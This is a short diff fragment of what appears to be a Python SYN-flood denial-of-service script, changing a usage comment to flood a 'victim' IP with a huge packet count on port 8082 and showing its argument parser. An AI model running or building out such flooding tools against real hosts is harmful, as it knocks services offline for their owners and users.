@@ -19,7 +19,7 @@ def random_IP():
 def get_args():
     parser = argparse.ArgumentParser(description="Sync Flooder\n")
     # Allow users to entert -flag arguments like Traditional Linux tools
-    # Looks like -t 192.168.2.65 -a 8888
+    # python3 flooder.py 192.168.2.65 -a 999999999 -p 8082
     parser.add_argument('t', help="Victim's IP Addr")
     parser.add_argument('-a', type=int, help="Amount of packets (default are infinitity)", default=DEFAULT_PACK)
     parser.add_argument('-p', type=int, help="Target Port (default ports are 8080/8081/8082)", default=80)
